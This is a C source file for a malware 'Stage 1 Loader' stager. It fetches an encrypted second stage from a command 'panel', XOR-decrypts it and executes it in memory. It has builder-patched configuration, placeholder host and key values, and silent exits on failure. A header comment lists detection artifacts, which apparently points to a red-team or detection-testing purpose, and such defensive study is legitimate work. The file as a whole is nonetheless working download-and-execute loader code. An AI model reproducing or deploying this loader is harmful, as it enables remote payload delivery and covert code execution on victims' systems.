/*
 * Stage 1 Loader - Entry Point
 *
 * Minimal stub that:
 * 1. Validates embedded config (magic check)
 * 2. Fetches encrypted Stage 2 from panel
 * 3. XOR decrypts the payload
 * 4. Executes Stage 2 in memory
 *
 * Target size: < 50KB stripped
 *
 * Detection artifacts:
 * - Magic bytes 0x4F584944 in binary
 * - HTTP request to /api/staging/
 * - RWX memory allocation
 * - XOR decryption loop pattern
 */

#include <stdio.h>
#include <stdlib.h>
#include "config.h"
#include "xor.h"
#include "http.h"
#include "mem_exec.h"

/*
 * Global configuration - patched by builder tool.
 * Default values for testing only.
 */
stage1_config_t g_config = {
    .magic = STAGE1_MAGIC,
    .flags = 0,
    .stage2_port = 8080,
    .stage_number = 2,
    .xor_key = {0x41, 0x42, 0x43, 0x44},  /* "ABCD" - placeholder */
    .xor_key_len = 4,
    .reserved = {0},
    .stage2_host = "127.0.0.1"
};

int main(void)
{
    uint8_t *payload = NULL;
    size_t payload_len = 0;
    int result = 1;

    /* Step 1: Validate config */
    if (!config_valid(&g_config)) {
        /* Invalid config - exit silently */
        goto cleanup;
    }

    /* Step 2: Fetch encrypted payload from panel */
    int http_result = http_fetch_stage(
        g_config.stage2_host,
        g_config.stage2_port,
        g_config.stage_number,
        &payload,
        &payload_len);

    if (http_result != HTTP_OK || !payload || payload_len == 0) {
        /* Fetch failed - exit silently */
        goto cleanup;
    }

    /* Step 3: XOR decrypt the payload */
    xor_decrypt(payload, payload_len,
                g_config.xor_key, g_config.xor_key_len);

    /* Step 4: Execute decrypted payload in memory */
    result = mem_run(payload, payload_len);

cleanup:
    /* Securely clear payload from heap */
    if (payload) {
        for (size_t i = 0; i < payload_len; i++) {
            payload[i] = 0;
        }
        free(payload);
    }

    return result;
}
